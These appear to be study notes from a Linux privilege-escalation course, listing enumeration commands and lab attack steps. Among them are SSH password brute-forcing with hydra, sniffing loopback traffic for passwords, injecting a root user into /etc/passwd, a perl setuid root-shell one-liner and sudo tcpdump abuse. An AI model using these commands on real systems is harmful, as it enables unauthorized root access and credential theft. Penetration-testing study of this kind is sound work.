---Enumerating Linux---
+++Understanding Files and Users Privileges on Linux
$ ls -l /etc/shadow

+++Manual Enumeration
$ id
$ cat /etc/passwd
$ hostname
$ cat /etc/issue
$ cat /etc/os-release
$ uname -a
$ ps aux
$ ip a
$ routel

Finally, we can display active network connections and listening ports using either netstat12 or ss,13 both of which accept the same arguments.
$ ss -anp

We can also search for files created by the iptables-save command, which is used to dump the firewall configuration to a file specified by the user. This file is then usually used as input for the iptables-restore command and used to restore the firewall rules at boot time. If a system administrator had ever run this command, we could search the configuration directory (/etc) or grep the file system for iptables commands to locate the file. If the file has insecure permissions, we could use the contents to infer the firewall configuration rules running on the system.
$ cat /etc/iptables/rules.v4

Cronjob
$ ls -lah /etc/cron*
$ crontab -l
$ sudo crontab -l

To list applications installed by dpkg on our Debian system, we can use dpkg -l.
$ dpkg -l

In the example below, we are searching for every directory writable by the current user on the target system. We'll search the whole root directory (/) and use the -writable argument to specify the attribute we are interested in. We can also use -type d to locate directories, and filter errors with 2>/dev/null:
$ find / -writable -type d 2>/dev/null

On Linux-based systems, we can use mount21 to list all mounted filesystems. In addition, the /etc/fstab22 file lists all drives that will be mounted at boot time.
$ cat /etc/fstab
$ mount
$ lsblk

Since this technique relies on matching vulnerabilities with corresponding exploits, we'll need to gather a list of drivers and kernel modules that are loaded on the target. We can enumerate the loaded kernel modules using lsmod without any additional arguments.
$ lsmod
$ /sbin/modinfo libata

We can use find to search for SUID-marked binaries. In this case, we are starting our search at the root directory (/), searching for files (-type f) with the SUID bit set, (-perm -u=s) and discarding all error messages (2>/dev/null):
$ find / -perm -u=s -type f 2>/dev/null

+++Automated Enumeration
To get an initial baseline of the target system, we can use unix-privesc-check1 on UNIX derivatives such as Linux. This Bash script is pre-installed on our local Kali machine at /usr/bin/unix-privesc-check, and it performs a number of checks to find any system misconfigurations that can be abused for local privilege escalation. We can review the tool's details by running the script without any arguments.
$ unix-privesc-check

---Exposed Confidential Information---
+++Inspecting User Trails
$ env
$ cat .bashrc

$ hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V

+++Inspecting Service Footprints
$ watch -n 1 "ps -aux | grep pass"

Let's try to capture traffic in and out of the loopback interface, then dump its content in ASCII using the -A parameter. Ultimately, we want to filter any traffic containing the "pass" keyword.
$ sudo tcpdump -i lo -A | grep "pass"

---Insecure File Permissions---
+++Abusing Cron Jobs
$ grep "CRON" /var/log/syslog

+++Abusing Password Authentication
$ openssl passwd w00t
$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
$ su root2

---Insecure System Components---
+++Abusing Setuid Binaries and Capabilities
$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

+++Abusing Sudo
$ sudo -l
User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get

Priv failed
```
$ COMMAND='id'
$ TF=$(mktemp)
$ echo "$COMMAND" > $TF
$ chmod +x $TF
$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
[sudo] password for joe:
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied

$ cat /var/log/syslog | grep tcpdump
...
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```

+++Exploiting Kernel Vulnerabilities
$ cat /etc/issue
$ uname -r
$ arch
$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
